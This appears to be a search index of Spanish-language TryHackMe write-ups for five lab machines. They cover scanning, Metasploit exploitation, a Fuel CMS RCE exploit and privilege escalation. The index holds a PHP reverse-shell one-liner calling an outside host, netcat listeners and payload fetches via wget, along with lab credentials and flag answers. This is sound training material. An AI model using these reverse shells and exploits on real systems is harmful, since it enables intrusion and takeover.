{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Machines Writeups","text":"<p>En este repositorio se guardan los write-ups redactados de m\u00e1quinas y desaf\u00edos de TryHackMe. El objetivo es documentar el proceso de resoluci\u00f3n de cada reto, proporcionando an\u00e1lisis paso a paso, t\u00e9cnicas utilizadas y aprendizajes clave.</p>"},{"location":"#maquinas","title":"Maquinas","text":"<ul> <li>1. Blue</li> <li>2. Ice</li> <li>21. Ignite</li> <li>27. Pickle Rick</li> <li>28. Daily Bugle</li> </ul>"},{"location":"1-BLUE/","title":"1 - Blue","text":"<p>Plataforma: TryHackMe Dificultad: F\u00e1cil OS: Windows</p>"},{"location":"1-BLUE/#herramientas-utilizadas","title":"Herramientas Utilizadas","text":"<ul> <li>Nmap</li> <li>Metasploit</li> <li>Hashcat</li> </ul>"},{"location":"1-BLUE/#reconocimiento","title":"Reconocimiento","text":""},{"location":"1-BLUE/#escaneo-de-puertos","title":"Escaneo de Puertos","text":"<ul> <li>1 . Escanear la direcci\u00f3n ip con un escaneo simple</li> </ul> <ul> <li>2 . Escanear los puertos encontrados con un escaneo mas agresivo</li> </ul> <p>Con esto podemos saber que se trata de una maquina con Windows 7.</p> <ul> <li>3 . Lanzar un escaneo para detectar posibles vulnerabilidades</li> </ul> <p></p> <p>Con esto podemos ver que la maquina es vulnerable al exploit ms17-010.</p>"},{"location":"1-BLUE/#explotacion","title":"Explotaci\u00f3n","text":"<p>Para la explotaci\u00f3n usare la herramienta Metasploit.</p>"},{"location":"1-BLUE/#ms17-010","title":"MS17-010","text":"<ul> <li>1 . Buscar el exploit en Metasploit</li> </ul> <ul> <li>2 . Configurar los par\u00e1metros y el payload del exploit y lanzarlo</li> </ul>"},{"location":"1-BLUE/#escalada-de-privilegios","title":"Escalada de Privilegios","text":""},{"location":"1-BLUE/#metodo-utilizado","title":"M\u00e9todo Utilizado","text":"<p>Para escalar privilegios mejorar la shell a una de meterpreter.</p>"},{"location":"1-BLUE/#proceso-de-escalada","title":"Proceso de Escalada","text":"<ul> <li>1 . Buscar informaci\u00f3n de que modulo usar para mejorar la shell</li> </ul> <ul> <li>2 . Cargar, configurar y lanzar el modulo</li> </ul> <p>Esto crea una nueva sesi\u00f3n con la shell de meterpreter.</p> <ul> <li>3 . Mirar proceso para escalar privilegios</li> </ul> <p>Listar los procesos con ps y migrar el proceso a uno que se este ejecutando como NT AUTHORITY/SYSTEM</p> <p></p> <p>Migro el proceso al proceso con id 668 ya que gestiona los servicios del sistema y es crucial para su funcionamiento.</p> <p></p>"},{"location":"1-BLUE/#dumpeo","title":"Dumpeo","text":"<p>Obtener la contrase\u00f1a del usuario no predeterminado y romperla</p>"},{"location":"1-BLUE/#proceso","title":"Proceso","text":"<ul> <li>1 . Ver los hashes de las contrase\u00f1as del sistema</li> </ul> <ul> <li>2 . Romper la contrase\u00f1a</li> </ul> <p>Para romper la contrase\u00f1a usamos la herramienta Hashcat</p> <p></p> <p></p>"},{"location":"1-BLUE/#flags","title":"Flags","text":"<ul> <li>1 . Flag 1</li> </ul> <p>La primera flag se encuentra en el directorio root</p> <p></p> <ul> <li>2 . Flag 2</li> </ul> <p>La segunda flag se encuentra donde se guardan las contrase\u00f1as en Windows, es decir, el directorio donde se encuentra el archivo SAM</p> <p></p> <p></p> <ul> <li>3 . Flag 3</li> </ul> <p>La tercera flag se encuentra en el directorio de documentos del usuario</p> <p></p> <p></p>"},{"location":"2-ICE/","title":"2 - ICE","text":"<p>Plataforma: TryHackMe Dificultad: F\u00e1cil OS: Windows</p>"},{"location":"2-ICE/#herramientas-utilizadas","title":"Herramientas Utilizadas","text":"<ul> <li>Nmap</li> <li>Metasploit</li> </ul>"},{"location":"2-ICE/#reconocimiento","title":"Reconocimiento","text":""},{"location":"2-ICE/#escaneo-de-puertos","title":"Escaneo de Puertos","text":"<ul> <li>1 . Escanear la direcci\u00f3n ip con un escaneo simple</li> </ul> <ul> <li>2 . Escanear los puertos encontrados con un escaneo mas agresivo</li> </ul> <p>Con esto podemos saber que se trata de una maquina con Windows Server 2008 y algunos servicios interesantes que se est\u00e1n ejecutando.</p> <p>Investigando sobre Icecast descubrimos la siguiente vulnerabilidad:</p> <p></p>"},{"location":"2-ICE/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"2-ICE/#cve-2004-1561","title":"CVE-2004-1561","text":"<p>Explotaremos la vulnerabilidad a trav\u00e9s de Metasploit.</p>"},{"location":"2-ICE/#proceso-de-explotacion","title":"Proceso de Explotaci\u00f3n","text":"<ul> <li>1 . Buscar el exploit en Metasploit y cargarlo</li> </ul> <ul> <li>2 . Configurar el exploit y lanzarlo</li> </ul>"},{"location":"2-ICE/#escalada-de-privilegios","title":"Escalada de Privilegios","text":"<p>Al entrar vemos que estamos registrados como el usuario Dark.</p>"},{"location":"2-ICE/#metodo-utilizado","title":"M\u00e9todo Utilizado","text":"<p>Lanzamos un segundo escaneo que nos revelara mas exploits que podremos usar para escalar privilegios</p> <p></p>"},{"location":"2-ICE/#proceso-de-escalada","title":"Proceso de Escalada","text":"<ul> <li>1 . Cargamos el segundo exploit que se muestra, configuramos el numero de sesion de nuestra shell y lo lanzamos</li> </ul> <ul> <li>2 . Listar los procesos y migrarnos a uno con permisos de administrador</li> </ul> <ul> <li>3 . Una vez somos administradores cargamos la herramienta kiwi para el volcado de contrase\u00f1as</li> </ul> <p>Una vez obtenida la contrase\u00f1a del usuario Dark, podr\u00edamos acceder a ella desde un escritorio remoto.</p>"},{"location":"2-ICE/#flags","title":"Flags","text":"<p>Sin flags</p> <p></p> <p>Writeup hecho por V\u00edctor Jim\u00e9nez Corada</p>"},{"location":"21-IGNITE/","title":"21 - Ignite","text":""},{"location":"21-IGNITE/#objetivo","title":"Objetivo","text":"<p>https://tryhackme.com/r/room/ignite</p> <p>IP: 10.10.172.69</p> <ul> <li>User.txt: 6470e394cbf6dab6a91682cc8585059b</li> <li>Root.txt: b9bbcb33e11b80be759c4e844862482d</li> </ul>"},{"location":"21-IGNITE/#procesos","title":"Procesos","text":"<pre><code>sudo nmap -sV &lt;SERVICE_VERSION&gt; -O &lt;OS&gt; -T4 &lt;INTENSIDAD&gt; &lt;IP&gt;\n</code></pre> <pre><code>sudo nmap -sV -O -T4 10.10.56.241\n</code></pre> <ul> <li> <p><code>-sV</code>: 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))</p> </li> <li> <p><code>-O</code>: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</p> </li> <li> <p><code>-T4</code>: En un rango de 1 a 5 lo agresivo (ruidoso) que quieres que sea el escaneo</p> </li> <li> </li> </ul> <pre><code>feroxbuster -u &lt;URL&gt; -t &lt;THREADS&gt; -L &lt;SCAN_LIMIT&gt; -n &lt;NO_RECURSION&gt; -w &lt;WORD_LIST&gt; -o &lt;OUTPUT&gt;\n</code></pre> <pre><code>feroxbuster -u http://10.10.172.69:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o outputIgnite.txt\n</code></pre> <ul> <li> </li> <li> </li> <li> </li> <li> </li> </ul> <pre><code>searchsploit &lt;SERVICE&gt;\n</code></pre> <pre><code>searchsploit fuel\n\n&gt; ------------------------------- ---------------------------------\n Exploit Title                   |  Path\n--------------------------------- ---------------------------------\nAMD Fuel Service - 'Fuel.service | windows/local/49535.txt\nFranklin Fueling Systems  TS-550 | hardware/remote/51321.txt\nFranklin Fueling Systems Colibri | linux/remote/50861.txt\nFranklin Fueling Systems TS-550  | hardware/remote/51382.txt\nFranklin Fueling TS-550 evo 2.0. | hardware/webapps/31180.txt\nfuel CMS 1.4.1 - Remote Code Exe | linux/webapps/47138.py\nFuel CMS 1.4.1 - Remote Code Exe | php/webapps/49487.rb\nFuel CMS 1.4.1 - Remote Code Exe | php/webapps/50477.py\nFuel CMS 1.4.13 - 'col' Blind SQ | php/webapps/50523.txt\nFuel CMS 1.4.7 - 'col' SQL Injec | php/webapps/48741.txt\nFuel CMS 1.4.8 - 'fuel_replace_i | php/webapps/48778.txt\nFuel CMS 1.5.0 - Cross-Site Requ | php/webapps/50884.txt\n--------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <ul> <li> </li> <li> <p>Descargar exploit y acceder a la shell</p> <p>https://www.exploit-db.com/exploits/50477</p> <pre><code>python3 50477.py -u http://10.10.172.69\n</code></pre> </li> <li> <p>Una vez accedido a la shell:</p> <pre><code>cat /home/www-data/flag.txt\n\n&gt; 6470e394cbf6dab6a91682cc8585059b\n</code></pre> </li> <li> <p>Mejorar la shell (Reverse shell):</p> <ol> <li> <p>Descargar y descomprimir:</p> <pre><code>wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz\n\ntar -xvzf php-reverse-shell-1.0.tar.gz\n</code></pre> </li> <li> <p>Levantar web server en el directorio de la reverse shell para pasarla a la maquina objetivo:</p> <pre><code>python3 -m http.server 80\n</code></pre> </li> <li> <p>Conectarme al servidor desde la maquina objetivo:</p> <pre><code>wget http://10.21.104.33/shell.php\n</code></pre> </li> <li> <p>Mejorar shell:</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> </li> <li> <p>Escuchar desde mi maquina con netcat:</p> <pre><code>netcat -nvlp 8085\n</code></pre> </li> <li> <p>Cargar la sell en el navegador: http://10.10.172.69/shell.php</p> </li> </ol> </li> <li> <p>Hacernos root:</p> <ol> <li> <p>Buscar archivo de configuracion:</p> <pre><code>cd /var/www/html/fuel/application/config\n</code></pre> </li> <li> <p>Conseguir credenciales root e identidicarnos como root:</p> <pre><code>cat database.php\n\n&gt; user: root\npassword: mememe\n</code></pre> <pre><code>su root\n</code></pre> </li> <li> <p>Acceder al directorio root (previamente oculto) y conseguir la flag:</p> <pre><code>cd /\ncd root\n</code></pre> <pre><code>cat root.txt\n\n&gt; b9bbcb33e11b80be759c4e844862482d\n</code></pre> </li> </ol> </li> </ul>"},{"location":"21-IGNITE/#escanear-puertos","title":"Escanear puertos","text":""},{"location":"21-IGNITE/#fuzzear","title":"Fuzzear","text":""},{"location":"21-IGNITE/#revisar-pagina-web","title":"Revisar pagina web","text":""},{"location":"21-IGNITE/#robottxt","title":"<code>Robot.txt</code>:","text":"<pre><code>User-agent: *\nDisallow: /fuel/\n</code></pre>"},{"location":"21-IGNITE/#fuel-login-page","title":"<code>/fuel</code> (Login page):","text":"<p>user: admin password: admin</p>"},{"location":"21-IGNITE/#buscar-vunerabilidades","title":"Buscar vunerabilidades:","text":""},{"location":"21-IGNITE/#explotar-vulnerabilidad","title":"Explotar vulnerabilidad:","text":""},{"location":"27-PICKLE%20RICK/","title":"27 - Pickle Rick","text":""},{"location":"27-PICKLE%20RICK/#objetivos","title":"Objetivos","text":""},{"location":"27-PICKLE%20RICK/#procesos","title":"Procesos","text":""},{"location":"27-PICKLE%20RICK/#escanear-puertos","title":"Escanear puertos","text":"<pre><code>nmap &lt;ip&gt; -A -T4 -p &lt;puertos_a_escanear&gt; -oX &lt;output.xml&gt;\n</code></pre> <pre><code>nmap 10.10.156.68 -A -T4 -p 22,80 -oX pickleR.xml\n</code></pre>"},{"location":"27-PICKLE%20RICK/#fuzzeo","title":"Fuzzeo","text":"<pre><code>feroxbuster -u &lt;URL&gt; -t &lt;THREADS&gt; -L &lt;SCAN_LIMIT&gt; -n &lt;NO_RECURSION&gt; -w &lt;WORD_LIST&gt; -o &lt;OUTPUT&gt;\n</code></pre> <pre><code>feroxbuster -u http://10.10.156.68:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o feroxBPickleR.txt\n</code></pre>"},{"location":"27-PICKLE%20RICK/#pagina-web","title":"Pagina web","text":"<ul> <li>Inspeccionar codigo</li> </ul> <p>R1ckRul3s</p> <ul> <li><code>/robots.txt</code></li> </ul> <p>Wubbalubbadubdub</p>"},{"location":"27-PICKLE%20RICK/#portalphp","title":"<code>/portal.php</code>","text":"<p>Posible XSS</p>"},{"location":"27-PICKLE%20RICK/#reverse-shell","title":"Reverse Shell","text":"<p>Ver que la p\u00e1gina esta hecha en PHP a traves de Wappalizer (extension) buscar reverse sheel en internal all the things.</p> <pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'\n</code></pre> <p>Cargar reverse shell:</p> <ol> <li>Escuchar en un puerto</li> </ol> <pre><code>nc -nvlp 8085\n</code></pre> <ol> <li> <p>Cargar script anterior en los comentarios de <code>/portal.php</code>:</p> </li> <li> <p>Escalada de privilegios</p> </li> <li> <p>Levantar servidor python:</p> </li> </ol> <pre><code>python3 -m http.server 80\n</code></pre> <ol> <li>Conectarme al servidor desde la m\u00e1quina objetivo</li> </ol> <pre><code>wget http://10.21.104.33/shell.php\n</code></pre>"},{"location":"28-DAILY%20BUGLE/","title":"28 - Daily Bugle","text":""},{"location":"28-DAILY%20BUGLE/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<ul> <li>Escaneo simple</li> </ul> <pre><code>sudo nmap 10.10.104.39 -sN\n</code></pre> <ul> <li>Escaneo agresivo</li> </ul> <pre><code>sudo nmap 10.10.104.39 -A -T4 -p 22 80 3306\n</code></pre>"},{"location":"28-DAILY%20BUGLE/#web","title":"Web","text":"<p>Al usar el addon Wappalyzer se puede ver que el gestor de contenidos de la pagina es Joomla:</p> <p></p> <p>Obtener versi\u00f3n de Joomla a trav\u00e9s de la herramienta Joomscan:</p> <pre><code>joomscan -u http://10.10.104.39\n</code></pre> <p></p> <p>Buscando vulnerabilidades para la versi\u00f3n 3.7.0 de Joomla encuentro la siguiente entrada en exploit-db.com:</p> <p></p> <p>Buscando el CVE en internet llego al siguiente repositorio:</p> <p></p> <p>Descargo el script de Python y exploto la vulnerabilidad:</p> <p></p>"}]}